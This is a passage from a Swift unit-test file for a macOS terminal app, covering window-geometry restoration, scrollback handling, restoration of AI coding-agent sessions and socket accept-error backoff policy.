        let savedFrame = SessionRectSnapshot(x: 1_200, y: 100, width: 600, height: 400)
        let savedDisplay = SessionDisplaySnapshot(
            displayID: 2,
            frame: SessionRectSnapshot(x: 1_000, y: 0, width: 1_000, height: 800),
            visibleFrame: SessionRectSnapshot(x: 1_000, y: 0, width: 1_000, height: 800)
        )

        // Display 1 and 2 swapped horizontal positions between snapshot and restore.
        let display1 = AppDelegate.SessionDisplayGeometry(
            displayID: 1,
            frame: CGRect(x: 1_000, y: 0, width: 1_000, height: 800),
            visibleFrame: CGRect(x: 1_000, y: 0, width: 1_000, height: 800)
        )
        let display2 = AppDelegate.SessionDisplayGeometry(
            displayID: 2,
            frame: CGRect(x: 0, y: 0, width: 1_000, height: 800),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_000, height: 800)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: savedDisplay,
            availableDisplays: [display1, display2],
            fallbackDisplay: display1
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertTrue(display2.visibleFrame.intersects(restored))
        XCTAssertFalse(display1.visibleFrame.intersects(restored))
        XCTAssertEqual(restored.width, 600, accuracy: 0.001)
        XCTAssertEqual(restored.height, 400, accuracy: 0.001)
        XCTAssertEqual(restored.minX, 200, accuracy: 0.001)
        XCTAssertEqual(restored.minY, 100, accuracy: 0.001)
    }

    func testResolvedWindowFrameKeepsIntersectingFrameWithoutDisplayMetadata() {
        let savedFrame = SessionRectSnapshot(x: 120, y: 80, width: 500, height: 350)
        let display = AppDelegate.SessionDisplayGeometry(
            displayID: 1,
            frame: CGRect(x: 0, y: 0, width: 1_000, height: 800),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_000, height: 800)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: nil,
            availableDisplays: [display],
            fallbackDisplay: display
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertEqual(restored.minX, 120, accuracy: 0.001)
        XCTAssertEqual(restored.minY, 80, accuracy: 0.001)
        XCTAssertEqual(restored.width, 500, accuracy: 0.001)
        XCTAssertEqual(restored.height, 350, accuracy: 0.001)
    }

    func testResolvedStartupPrimaryWindowFrameFallsBackToPersistedGeometryWhenPrimaryMissing() {
        let fallbackFrame = SessionRectSnapshot(x: 180, y: 140, width: 900, height: 640)
        let fallbackDisplay = SessionDisplaySnapshot(
            displayID: 1,
            frame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000),
            visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000)
        )
        let display = AppDelegate.SessionDisplayGeometry(
            displayID: 1,
            frame: CGRect(x: 0, y: 0, width: 1_600, height: 1_000),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_600, height: 1_000)
        )

        let restored = AppDelegate.resolvedStartupPrimaryWindowFrame(
            primarySnapshot: nil,
            fallbackFrame: fallbackFrame,
            fallbackDisplaySnapshot: fallbackDisplay,
            availableDisplays: [display],
            fallbackDisplay: display
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertEqual(restored.minX, 180, accuracy: 0.001)
        XCTAssertEqual(restored.minY, 140, accuracy: 0.001)
        XCTAssertEqual(restored.width, 900, accuracy: 0.001)
        XCTAssertEqual(restored.height, 640, accuracy: 0.001)
    }

    func testResolvedStartupPrimaryWindowFramePrefersPrimarySnapshotOverFallback() {
        let primarySnapshot = SessionWindowSnapshot(
            frame: SessionRectSnapshot(x: 220, y: 160, width: 980, height: 700),
            display: SessionDisplaySnapshot(
                displayID: 1,
                frame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000),
                visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000)
            ),
            tabManager: SessionTabManagerSnapshot(selectedWorkspaceIndex: nil, workspaces: []),
            sidebar: SessionSidebarSnapshot(isVisible: true, selection: .tabs, width: 220)
        )
        let fallbackFrame = SessionRectSnapshot(x: 40, y: 30, width: 700, height: 500)
        let fallbackDisplay = SessionDisplaySnapshot(
            displayID: 1,
            frame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000),
            visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000)
        )
        let display = AppDelegate.SessionDisplayGeometry(
            displayID: 1,
            frame: CGRect(x: 0, y: 0, width: 1_600, height: 1_000),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_600, height: 1_000)
        )

        let restored = AppDelegate.resolvedStartupPrimaryWindowFrame(
            primarySnapshot: primarySnapshot,
            fallbackFrame: fallbackFrame,
            fallbackDisplaySnapshot: fallbackDisplay,
            availableDisplays: [display],
            fallbackDisplay: display
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertEqual(restored.minX, 220, accuracy: 0.001)
        XCTAssertEqual(restored.minY, 160, accuracy: 0.001)
        XCTAssertEqual(restored.width, 980, accuracy: 0.001)
        XCTAssertEqual(restored.height, 700, accuracy: 0.001)
    }

    func testDecodedPersistedWindowGeometryDataAcceptsCurrentSchema() throws {
        let data = try JSONEncoder().encode(
            AppDelegate.PersistedWindowGeometry(
                version: AppDelegate.persistedWindowGeometrySchemaVersion,
                frame: SessionRectSnapshot(x: 220, y: 160, width: 980, height: 700),
                display: SessionDisplaySnapshot(
                    displayID: 1,
                    frame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000),
                    visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000)
                )
            )
        )

        let decoded = try XCTUnwrap(AppDelegate.decodedPersistedWindowGeometryData(data))
        XCTAssertEqual(decoded.version, AppDelegate.persistedWindowGeometrySchemaVersion)
        XCTAssertEqual(decoded.frame.x, 220, accuracy: 0.001)
        XCTAssertEqual(decoded.frame.y, 160, accuracy: 0.001)
        XCTAssertEqual(decoded.frame.width, 980, accuracy: 0.001)
        XCTAssertEqual(decoded.frame.height, 700, accuracy: 0.001)
        XCTAssertEqual(decoded.display?.displayID, 1)
    }

    func testDecodedPersistedWindowGeometryDataRejectsLegacyUnversionedPayload() throws {
        let data = try JSONEncoder().encode(
            LegacyPersistedWindowGeometry(
                frame: SessionRectSnapshot(x: 180, y: 140, width: 900, height: 640),
                display: SessionDisplaySnapshot(
                    displayID: 1,
                    frame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000),
                    visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 1_600, height: 1_000)
                )
            )
        )

        XCTAssertNil(AppDelegate.decodedPersistedWindowGeometryData(data))
    }

    func testDecodedPersistedWindowGeometryDataRejectsDifferentSchemaVersion() throws {
        let data = try JSONEncoder().encode(
            AppDelegate.PersistedWindowGeometry(
                version: AppDelegate.persistedWindowGeometrySchemaVersion + 1,
                frame: SessionRectSnapshot(x: 220, y: 160, width: 980, height: 700),
                display: nil
            )
        )

        XCTAssertNil(AppDelegate.decodedPersistedWindowGeometryData(data))
    }

    func testResolvedWindowFrameCentersInFallbackDisplayWhenOffscreen() {
        let savedFrame = SessionRectSnapshot(x: 4_000, y: 4_000, width: 900, height: 700)
        let display = AppDelegate.SessionDisplayGeometry(
            displayID: 1,
            frame: CGRect(x: 0, y: 0, width: 1_000, height: 800),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_000, height: 800)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: nil,
            availableDisplays: [display],
            fallbackDisplay: display
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertTrue(display.visibleFrame.contains(restored))
        XCTAssertEqual(restored.minX, 50, accuracy: 0.001)
        XCTAssertEqual(restored.minY, 50, accuracy: 0.001)
        XCTAssertEqual(restored.width, 900, accuracy: 0.001)
        XCTAssertEqual(restored.height, 700, accuracy: 0.001)
    }

    func testResolvedWindowFramePreservesExactGeometryWhenDisplayIsUnchanged() {
        let savedFrame = SessionRectSnapshot(x: 1_303, y: -90, width: 1_280, height: 1_410)
        let savedDisplay = SessionDisplaySnapshot(
            displayID: 2,
            frame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_440),
            visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_410)
        )
        let display = AppDelegate.SessionDisplayGeometry(
            displayID: 2,
            frame: CGRect(x: 0, y: 0, width: 2_560, height: 1_440),
            visibleFrame: CGRect(x: 0, y: 0, width: 2_560, height: 1_410)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: savedDisplay,
            availableDisplays: [display],
            fallbackDisplay: display
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertEqual(restored.minX, 1_303, accuracy: 0.001)
        XCTAssertEqual(restored.minY, -90, accuracy: 0.001)
        XCTAssertEqual(restored.width, 1_280, accuracy: 0.001)
        XCTAssertEqual(restored.height, 1_410, accuracy: 0.001)
    }

    func testResolvedWindowFramePreservesExactGeometryWhenDisplayChangesButWindowRemainsAccessible() {
        let savedFrame = SessionRectSnapshot(x: 1_100, y: -20, width: 1_280, height: 1_000)
        let savedDisplay = SessionDisplaySnapshot(
            displayID: 2,
            frame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_440),
            visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_410)
        )
        let adjustedDisplay = AppDelegate.SessionDisplayGeometry(
            displayID: 2,
            frame: CGRect(x: 0, y: 0, width: 2_560, height: 1_440),
            visibleFrame: CGRect(x: 0, y: 40, width: 2_560, height: 1_360)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: savedDisplay,
            availableDisplays: [adjustedDisplay],
            fallbackDisplay: adjustedDisplay
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertEqual(restored.minX, 1_100, accuracy: 0.001)
        XCTAssertEqual(restored.minY, -20, accuracy: 0.001)
        XCTAssertEqual(restored.width, 1_280, accuracy: 0.001)
        XCTAssertEqual(restored.height, 1_000, accuracy: 0.001)
    }

    func testResolvedWindowFrameClampsWhenDisplayGeometryChangesEvenWithSameDisplayID() {
        let savedFrame = SessionRectSnapshot(x: 1_303, y: -90, width: 1_280, height: 1_410)
        let savedDisplay = SessionDisplaySnapshot(
            displayID: 2,
            frame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_440),
            visibleFrame: SessionRectSnapshot(x: 0, y: 0, width: 2_560, height: 1_410)
        )
        let resizedDisplay = AppDelegate.SessionDisplayGeometry(
            displayID: 2,
            frame: CGRect(x: 0, y: 0, width: 1_920, height: 1_080),
            visibleFrame: CGRect(x: 0, y: 0, width: 1_920, height: 1_050)
        )

        let restored = AppDelegate.resolvedWindowFrame(
            from: savedFrame,
            display: savedDisplay,
            availableDisplays: [resizedDisplay],
            fallbackDisplay: resizedDisplay
        )

        XCTAssertNotNil(restored)
        guard let restored else { return }
        XCTAssertTrue(resizedDisplay.visibleFrame.contains(restored))
        XCTAssertNotEqual(restored.minX, 1_303, "Changed display geometry should clamp/remap frame")
        XCTAssertNotEqual(restored.minY, -90, "Changed display geometry should clamp/remap frame")
    }

    func testResolvedSnapshotTerminalScrollbackPrefersCaptured() {
        let resolved = Workspace.resolvedSnapshotTerminalScrollback(
            capturedScrollback: "captured-value",
            fallbackScrollback: "fallback-value"
        )

        XCTAssertEqual(resolved, "captured-value")
    }

    func testResolvedSnapshotTerminalScrollbackFallsBackWhenCaptureMissing() {
        let resolved = Workspace.resolvedSnapshotTerminalScrollback(
            capturedScrollback: nil,
            fallbackScrollback: "fallback-value"
        )

        XCTAssertEqual(resolved, "fallback-value")
    }

    func testResolvedSnapshotTerminalScrollbackTruncatesFallback() {
        let oversizedFallback = String(
            repeating: "x",
            count: SessionPersistencePolicy.maxScrollbackCharactersPerTerminal + 37
        )
        let resolved = Workspace.resolvedSnapshotTerminalScrollback(
            capturedScrollback: nil,
            fallbackScrollback: oversizedFallback
        )

        XCTAssertEqual(
            resolved?.count,
            SessionPersistencePolicy.maxScrollbackCharactersPerTerminal
        )
    }

    func testResolvedSnapshotTerminalScrollbackSkipsFallbackWhenRestoreIsUnsafe() {
        let resolved = Workspace.resolvedSnapshotTerminalScrollback(
            capturedScrollback: nil,
            fallbackScrollback: "fallback-value",
            allowFallbackScrollback: false
        )

        XCTAssertNil(resolved)
    }

    func testRestorableAgentRestoreSuppressesSavedScrollbackReplay() {
        let agent = SessionRestorableAgentSnapshot(
            kind: .claude,
            sessionId: "claude-session-123",
            workingDirectory: "/tmp/repo",
            launchCommand: nil
        )

        XCTAssertFalse(Workspace.shouldReplaySessionScrollback(restorableAgent: agent))
        XCTAssertTrue(Workspace.shouldReplaySessionScrollback(restorableAgent: nil))
    }

    @MainActor
    func testRestoredAgentFirstAutoResumeCommandDoesNotClearSnapshot() throws {
        let source = Workspace()
        let sourcePanelId = try XCTUnwrap(source.focusedPanelId)
        let sourceIndex = try makeRestorableAgentIndex(
            workspaceId: source.id,
            panelId: sourcePanelId,
            sessionId: "codex-restored-session",
            arguments: [
                "/usr/local/bin/codex",
                "--model",
                "gpt-5.4",
            ]
        )
        let snapshot = source.sessionSnapshot(
            includeScrollback: false,
            restorableAgentIndex: sourceIndex
        )

        let restored = Workspace()
        restored.restoreSessionSnapshot(snapshot)
        let restoredPanelId = try XCTUnwrap(restored.focusedPanelId)

        restored.updatePanelShellActivityState(panelId: restoredPanelId, state: .commandRunning)
        let autoResumeSnapshot = restored.sessionSnapshot(includeScrollback: false)
        XCTAssertEqual(autoResumeSnapshot.panels.first?.terminal?.agent?.sessionId, "codex-restored-session")

        restored.updatePanelShellActivityState(panelId: restoredPanelId, state: .promptIdle)
        restored.updatePanelShellActivityState(panelId: restoredPanelId, state: .commandRunning)
        let userCommandSnapshot = restored.sessionSnapshot(includeScrollback: false)
        XCTAssertNil(userCommandSnapshot.panels.first?.terminal?.agent)
    }

    @MainActor
    func testRestoredAgentWithoutResumeCommandInvalidatesOnFirstCommand() throws {
        let source = Workspace()
        let sourcePanelId = try XCTUnwrap(source.focusedPanelId)
        let sourceIndex = try makeRestorableAgentIndex(
            kind: .claude,
            workspaceId: source.id,
            panelId: sourcePanelId,
            sessionId: "claude-print-session",
            arguments: [
                "/usr/local/bin/claude",
                "--print",
            ]
        )
        let snapshot = source.sessionSnapshot(
            includeScrollback: false,
            restorableAgentIndex: sourceIndex
        )

        let restored = Workspace()
        restored.restoreSessionSnapshot(snapshot)
        let restoredPanelId = try XCTUnwrap(restored.focusedPanelId)
        XCTAssertNil(restored.sessionSnapshot(includeScrollback: false).panels.first?.terminal?.agent?.resumeCommand)

        restored.updatePanelShellActivityState(panelId: restoredPanelId, state: .commandRunning)
        let userCommandSnapshot = restored.sessionSnapshot(includeScrollback: false)
        XCTAssertNil(userCommandSnapshot.panels.first?.terminal?.agent)
    }

    @MainActor
    func testPruneSurfaceMetadataRemovesRestoredAgentBookkeeping() throws {
        let source = Workspace()
        let sourcePanelId = try XCTUnwrap(source.focusedPanelId)
        let sourceIndex = try makeRestorableAgentIndex(
            workspaceId: source.id,
            panelId: sourcePanelId,
            sessionId: "codex-prune-pending-session",
            arguments: [
                "/usr/local/bin/codex",
                "--model",
                "gpt-5.4",
            ]
        )
        let snapshot = source.sessionSnapshot(
            includeScrollback: false,
            restorableAgentIndex: sourceIndex
        )

        let restored = Workspace()
        restored.restoreSessionSnapshot(snapshot)
        let restoredPanelId = try XCTUnwrap(restored.focusedPanelId)
        restored.pruneSurfaceMetadata(validSurfaceIds: [])

        let postPruneIndex = try makeRestorableAgentIndex(
            workspaceId: restored.id,
            panelId: restoredPanelId,
            sessionId: "codex-post-prune-session",
            arguments: [
                "/usr/local/bin/codex",
                "--model",
                "gpt-5.4-mini",
            ]
        )
        let postPruneSnapshot = restored.sessionSnapshot(
            includeScrollback: false,
            restorableAgentIndex: postPruneIndex
        )
        XCTAssertEqual(
            postPruneSnapshot.panels.first?.terminal?.agent?.sessionId,
            "codex-post-prune-session"
        )

        restored.updatePanelShellActivityState(panelId: restoredPanelId, state: .promptIdle)
        restored.updatePanelShellActivityState(panelId: restoredPanelId, state: .commandRunning)
        let userCommandSnapshot = restored.sessionSnapshot(includeScrollback: false)
        XCTAssertNil(userCommandSnapshot.panels.first?.terminal?.agent)

        let staleWorkspace = Workspace()
        let stalePanelId = try XCTUnwrap(staleWorkspace.focusedPanelId)
        let staleIndex = try makeRestorableAgentIndex(
            workspaceId: staleWorkspace.id,
            panelId: stalePanelId,
            sessionId: "codex-prune-invalidated-session",
            arguments: [
                "/usr/local/bin/codex",
                "--model",
                "gpt-5.4",
            ]
        )
        _ = staleWorkspace.sessionSnapshot(
            includeScrollback: false,
            restorableAgentIndex: staleIndex
        )

        staleWorkspace.updatePanelShellActivityState(panelId: stalePanelId, state: .promptIdle)
        staleWorkspace.updatePanelShellActivityState(panelId: stalePanelId, state: .commandRunning)
        let staleSnapshot = staleWorkspace.sessionSnapshot(
            includeScrollback: false,
            restorableAgentIndex: staleIndex
        )
        XCTAssertNil(staleSnapshot.panels.first?.terminal?.agent)

        staleWorkspace.pruneSurfaceMetadata(validSurfaceIds: [])
        let acceptedSnapshot = staleWorkspace.sessionSnapshot(
            includeScrollback: false,
            restorableAgentIndex: staleIndex
        )
        XCTAssertEqual(
            acceptedSnapshot.panels.first?.terminal?.agent?.sessionId,
            "codex-prune-invalidated-session"
        )
    }

    @MainActor
    func testUserCommandInvalidatesStaleRestoredAgentForAllProviders() throws {
        let scenarios: [(kind: RestorableAgentKind, arguments: [String])] = [
            (
                .claude,
                [
                    "/usr/local/bin/claude",
                    "--model",
                    "sonnet",
                ]
            ),
            (
                .codex,
                [
                    "/usr/local/bin/codex",
                    "--model",
                    "gpt-5.4",
                ]
            ),
            (
                .pi,
                [
                    "/usr/local/bin/pi",
                    "--model",
                    "anthropic/claude-sonnet-4-5",
                ]
            ),
            (
                .cursor,
                [
                    "/usr/local/bin/cursor-agent",
                    "--model",
                    "gpt-5.4",
                ]
            ),
            (
                .gemini,
                [
                    "/usr/local/bin/gemini",
                    "--model",
                    "gemini-2.5-pro",
                ]
            ),
            (
                .opencode,
                [
                    "/usr/local/bin/opencode",
                    "--model",
                    "anthropic/claude-sonnet-4-5",
                ]
            ),
            (
                .rovodev,
                [
                    "/usr/local/bin/acli",
                    "rovodev",
                    "run",
                    "--yolo",
                ]
            ),
            (.hermesAgent, ["/usr/local/bin/hermes", "--tui", "--model", "anthropic/claude-sonnet-4.6"]),
            (
                .copilot,
                [
                    "/usr/local/bin/copilot",
                    "--model",
                    "gpt-5.4",
                ]
            ),
            (
                .codebuddy,
                [
                    "/usr/local/bin/codebuddy",
                    "--model",
                    "gpt-5.4",
                ]
            ),
            (
                .factory,
                [
                    "/usr/local/bin/droid",
                    "--cwd",
                    "/tmp/repo",
                ]
            ),
            (
                .qoder,
                [
                    "/usr/local/bin/qodercli",
                    "--model",
                    "gemini-2.5-pro",
                ]
            ),
        ]

        for scenario in scenarios {
            let workspace = Workspace()
            let panelId = try XCTUnwrap(workspace.focusedPanelId)
            let staleIndex = try makeRestorableAgentIndex(
                kind: scenario.kind,
                workspaceId: workspace.id,
                panelId: panelId,
                sessionId: "\(scenario.kind.rawValue)-old-session",
                arguments: scenario.arguments
            )
            let initialSnapshot = workspace.sessionSnapshot(
                includeScrollback: false,
                restorableAgentIndex: staleIndex
            )
            XCTAssertEqual(initialSnapshot.panels.first?.terminal?.agent?.kind, scenario.kind)

            workspace.updatePanelShellActivityState(panelId: panelId, state: .promptIdle)
            workspace.updatePanelShellActivityState(panelId: panelId, state: .commandRunning)

            let staleSnapshot = workspace.sessionSnapshot(
                includeScrollback: false,
                restorableAgentIndex: staleIndex
            )
            XCTAssertNil(staleSnapshot.panels.first?.terminal?.agent, scenario.kind.rawValue)
        }
    }

    @MainActor
    func testUserCommandInvalidatesStaleRestoredAgentButAcceptsNewHookFlags() throws {
        let workspace = Workspace()
        let panelId = try XCTUnwrap(workspace.focusedPanelId)
        let staleIndex = try makeRestorableAgentIndex(
            workspaceId: workspace.id,
            panelId: panelId,
            sessionId: "codex-old-session",
            arguments: [
                "/usr/local/bin/codex",
                "--model",
                "gpt-5.4",
            ]
        )
        let initialSnapshot = workspace.sessionSnapshot(
            includeScrollback: false,
            restorableAgentIndex: staleIndex
        )
        XCTAssertEqual(initialSnapshot.panels.first?.terminal?.agent?.sessionId, "codex-old-session")

        workspace.updatePanelShellActivityState(panelId: panelId, state: .promptIdle)
        workspace.updatePanelShellActivityState(panelId: panelId, state: .commandRunning)

        let staleSnapshot = workspace.sessionSnapshot(
            includeScrollback: false,
            restorableAgentIndex: staleIndex
        )
        XCTAssertNil(staleSnapshot.panels.first?.terminal?.agent)

        let newIndex = try makeRestorableAgentIndex(
            workspaceId: workspace.id,
            panelId: panelId,
            sessionId: "codex-new-session",
            arguments: [
                "/usr/local/bin/codex",
                "--model",
                "gpt-5.4-mini",
                "--sandbox",
                "danger-full-access",
            ]
        )
        let newSnapshot = workspace.sessionSnapshot(
            includeScrollback: false,
            restorableAgentIndex: newIndex
        )
        let newAgent = try XCTUnwrap(newSnapshot.panels.first?.terminal?.agent)
        XCTAssertEqual(newAgent.sessionId, "codex-new-session")
        XCTAssertEqual(
            newAgent.launchCommand?.arguments,
            [
                "/usr/local/bin/codex",
                "--model",
                "gpt-5.4-mini",
                "--sandbox",
                "danger-full-access",
            ]
        )
    }

    private func makeRestorableAgentIndex(
        kind: RestorableAgentKind = .codex,
        workspaceId: UUID,
        panelId: UUID,
        sessionId: String,
        arguments: [String],
        launcher: String? = nil,
        executablePath: String? = nil,
        environment: [String: String]? = nil
    ) throws -> RestorableAgentSessionIndex {
        let home = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-agent-hook-store-\(UUID().uuidString)", isDirectory: true)
        let storeURL = kind.hookStoreFileURL(homeDirectory: home.path)
        try FileManager.default.createDirectory(
            at: storeURL.deletingLastPathComponent(),
            withIntermediateDirectories: true
        )
        defer { try? FileManager.default.removeItem(at: home) }

        let resolvedEnvironment: [String: String]
        if let environment {
            resolvedEnvironment = environment
        } else {
            switch kind {
            case .claude:
                resolvedEnvironment = ["CLAUDE_CONFIG_DIR": "/tmp/claude"]
            case .codex:
                resolvedEnvironment = ["CODEX_HOME": "/tmp/codex"]
            case .pi:
                resolvedEnvironment = ["PI_CODING_AGENT_DIR": "/tmp/pi"]
            case .cursor, .rovodev, .factory, .custom:
                resolvedEnvironment = [:]
            case .gemini:
                resolvedEnvironment = ["GEMINI_CLI_HOME": "/tmp/gemini"]
            case .opencode:
                resolvedEnvironment = ["OPENCODE_CONFIG_DIR": "/tmp/opencode"]
            case .hermesAgent:
                resolvedEnvironment = ["HERMES_HOME": "/tmp/hermes"]
            case .copilot:
                resolvedEnvironment = ["COPILOT_HOME": "/tmp/copilot"]
            case .codebuddy:
                resolvedEnvironment = ["CODEBUDDY_CONFIG_DIR": "/tmp/codebuddy"]
            case .qoder:
                resolvedEnvironment = ["QODER_CONFIG_DIR": "/tmp/qoder"]
            }
        }
        let resolvedExecutablePath = executablePath ?? arguments.first ?? "/usr/local/bin/\(kind.rawValue)"
        let resolvedLauncher = launcher ?? kind.rawValue

        let jsonObject: [String: Any] = [
            "version": 1,
            "sessions": [
                sessionId: [
                    "sessionId": sessionId,
                    "workspaceId": workspaceId.uuidString,
                    "surfaceId": panelId.uuidString,
                    "cwd": "/tmp/repo",
                    "updatedAt": Date().timeIntervalSince1970,
                    "launchCommand": [
                        "launcher": resolvedLauncher,
                        "executablePath": resolvedExecutablePath,
                        "arguments": arguments,
                        "workingDirectory": "/tmp/repo",
                        "environment": resolvedEnvironment,
                        "capturedAt": Date().timeIntervalSince1970,
                        "source": "process",
                    ],
                ],
            ],
        ]
        let data = try JSONSerialization.data(withJSONObject: jsonObject, options: [.prettyPrinted])
        try data.write(to: storeURL, options: .atomic)

        return RestorableAgentSessionIndex.load(homeDirectory: home.path)
    }

    private func makeSnapshot(version: Int) -> AppSessionSnapshot {
        let workspace = SessionWorkspaceSnapshot(
            processTitle: "Terminal",
            customTitle: "Restored",
            customColor: nil,
            isPinned: true,
            currentDirectory: "/tmp",
            focusedPanelId: nil,
            layout: .pane(SessionPaneLayoutSnapshot(panelIds: [], selectedPanelId: nil)),
            panels: [],
            statusEntries: [],
            logEntries: [],
            progress: nil,
            gitBranch: nil
        )

        let tabManager = SessionTabManagerSnapshot(
            selectedWorkspaceIndex: 0,
            workspaces: [workspace]
        )

        let window = SessionWindowSnapshot(
            frame: SessionRectSnapshot(x: 10, y: 20, width: 900, height: 700),
            display: SessionDisplaySnapshot(
                displayID: 42,
                frame: SessionRectSnapshot(x: 0, y: 0, width: 1920, height: 1200),
                visibleFrame: SessionRectSnapshot(x: 0, y: 25, width: 1920, height: 1175)
            ),
            tabManager: tabManager,
            sidebar: SessionSidebarSnapshot(isVisible: true, selection: .tabs, width: 240)
        )

        return AppSessionSnapshot(
            version: version,
            createdAt: Date().timeIntervalSince1970,
            windows: [window]
        )
    }

    private func fileNumber(for fileURL: URL) throws -> Int {
        let attributes = try FileManager.default.attributesOfItem(atPath: fileURL.path)
        return try XCTUnwrap(attributes[.systemFileNumber] as? Int)
    }
}

final class SocketListenerAcceptPolicyTests: XCTestCase {
    func testAcceptErrorClassificationBucketsExpectedErrnos() {
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: EINTR),
            "immediate_retry"
        )
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: ECONNABORTED),
            "immediate_retry"
        )
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: EMFILE),
            "resource_pressure"
        )
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: ENOMEM),
            "resource_pressure"
        )
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: EBADF),
            "fatal"
        )
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: EINVAL),
            "fatal"
        )
    }

    func testAcceptErrorPolicySignalsRearmOnlyForFatalErrors() {
        XCTAssertTrue(TerminalController.shouldRearmListenerForAcceptError(errnoCode: EBADF))
        XCTAssertTrue(TerminalController.shouldRearmListenerForAcceptError(errnoCode: ENOTSOCK))
        XCTAssertFalse(TerminalController.shouldRearmListenerForAcceptError(errnoCode: EMFILE))
        XCTAssertFalse(TerminalController.shouldRearmListenerForAcceptError(errnoCode: EINTR))
    }

    func testAcceptErrorPolicyRearmsAfterPersistentFailures() {
        XCTAssertFalse(TerminalController.shouldRearmForConsecutiveAcceptFailures(consecutiveFailures: 0))
        XCTAssertFalse(TerminalController.shouldRearmForConsecutiveAcceptFailures(consecutiveFailures: 49))
        XCTAssertTrue(TerminalController.shouldRearmForConsecutiveAcceptFailures(consecutiveFailures: 50))
        XCTAssertTrue(TerminalController.shouldRearmForConsecutiveAcceptFailures(consecutiveFailures: 120))
    }

    func testAcceptFailureBackoffIsExponentialAndCapped() {
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 0),
            0
        )
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 1),
            10
        )
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 2),
            20
        )
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 6),
            320
        )
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 12),
            5_000
        )
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 50),
            5_000
        )
    }

    func testAcceptFailureRearmDelayAppliesMinimumThrottle() {
        XCTAssertEqual(
            TerminalController.acceptFailureRearmDelayMilliseconds(consecutiveFailures: 0),
            100
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRearmDelayMilliseconds(consecutiveFailures: 1),
            100
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRearmDelayMilliseconds(consecutiveFailures: 2),
            100
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRearmDelayMilliseconds(consecutiveFailures: 6),
            320
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRearmDelayMilliseconds(consecutiveFailures: 12),
            5_000
        )
    }

    func testAcceptFailureRecoveryActionResumesAfterDelayForTransientErrors() {
        XCTAssertEqual(
            TerminalController.acceptFailureRecoveryAction(
                errnoCode: EPROTO,
                consecutiveFailures: 1
            ),
            .resumeAfterDelay(delayMs: 10)
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRecoveryAction(
                errnoCode: EMFILE,
                consecutiveFailures: 3
            ),
            .resumeAfterDelay(delayMs: 40)
        )
    }

    func testAcceptFailureRecoveryActionRearmsForFatalAndPersistentFailures() {
        XCTAssertEqual(
            TerminalController.acceptFailureRecoveryAction(
                errnoCode: EBADF,
                consecutiveFailures: 1
            ),
            .rearmAfterDelay(delayMs: 100)
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRecoveryAction(
                errnoCode: EPROTO,
                consecutiveFailures: 50
            ),
            .rearmAfterDelay(delayMs: 5_000)
        )
    }

    func testAcceptFailureBreadcrumbSamplingPrefersEarlyAndPowerOfTwoMilestones() {
        XCTAssertTrue(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 1))
        XCTAssertTrue(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 2))
        XCTAssertTrue(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 3))
        XCTAssertFalse(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 5))
        XCTAssertTrue(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 8))
